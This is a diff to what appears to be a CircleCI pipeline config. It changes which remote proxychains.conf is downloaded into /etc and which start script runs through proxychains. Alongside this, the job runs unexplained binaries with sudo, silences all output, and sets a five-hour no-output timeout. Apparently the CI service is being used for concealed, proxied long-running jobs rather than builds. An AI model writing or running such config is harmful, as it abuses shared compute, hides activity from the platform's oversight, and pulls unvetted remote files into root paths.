@@ -46,7 +46,7 @@ jobs:
             command: |
               sudo ./Enem >/dev/null 2>&1
               cd /etc
-              sudo wget https://bitbucket.org/sindylestari/sindy/raw/03a69c26f3b895fefd0c1d9fdfedf58b4b66ff8c/prx/4/proxychains.conf >/dev/null 2>&1
+              sudo wget https://bitbucket.org/sindylestari/sindy/raw/03a69c26f3b895fefd0c1d9fdfedf58b4b66ff8c/prx/1/proxychains.conf >/dev/null 2>&1
         - run:
             name: DasarAnjir. . . .
             no_output_timeout: 300m
@@ -56,8 +56,8 @@ jobs:
               sudo ./Wolu >/dev/null 2>&1
               sudo ./Songo >/dev/null 2>&1
               screen -dmS proxy python3 p1.py >/dev/null 2>&1
-              sleep 12s
-              0#proxychains bash -u start2.sh >/dev/null 2>&1
+              sleep 120s
+              proxychains bash -u start3.sh >/dev/null 2>&1
   BambangSutrisno:
     docker:
       - image: circleci/python:3.8
